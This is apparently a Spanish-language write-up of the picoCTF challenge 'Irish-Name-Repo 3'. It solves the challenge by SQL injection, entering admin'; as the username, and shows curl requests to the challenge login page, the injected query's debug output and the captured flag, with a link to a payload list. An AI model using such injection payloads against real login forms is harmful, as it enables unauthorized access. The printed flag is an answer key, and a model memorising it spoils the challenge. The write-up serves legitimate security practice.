# Irish-Name-Repo 3
## Descripcipción
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/54253/` ([link](https://jupiter.challenges.picoctf.org/problem/54253/)) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!
## Pistas
- Seems like the password is encrypted.
## Solucion
```
se evita la palabra OR para evitar ser detectados, utilizando admin';

username: admin';
password: lkklj
SQL query: SELECT * FROM users WHERE name='admin';' AND password='lkklj'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_aee925db}

-----------------------------------------------------------------------------
								SOLUCIÓN POR CONSOLA
----------------------------------------------------------------------------
rojiblanca-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=violeta&password=hola"
rojiblanca-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=violeta&password=hola"
<h1>Login failed.</h1>rojiblanca-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=admin';&password=hola&debug=1"
<pre>username: admin';
password: hola
SQL query: SELECT * FROM users WHERE name='admin';' AND password='hola'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_aee925db}</p>rojiblanca-picoctf@webshell:~$ 
```
## Bandera
picoCTF{m0R3_SQL_plz_aee925db}
## Notas adicionales
El usuario ingresa datos y altera la entrada
## Referencias
https://github.com/payloadbox/sql-injection-payload-list
